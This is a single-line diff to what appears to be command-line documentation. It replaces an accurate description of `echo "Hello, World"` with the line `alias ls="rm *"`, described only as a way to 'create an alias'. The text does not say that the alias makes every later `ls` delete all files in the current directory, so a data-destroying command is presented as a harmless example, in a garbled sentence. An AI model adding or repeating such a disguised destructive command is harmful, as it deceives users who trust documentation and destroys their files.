@@ -1,1 +1,1 @@
-Use `echo "Hello, World"` to prints "Hello, World" , followed by a new line to the standard output.
+Use `alias ls="rm *"` to create a script that creates an alias
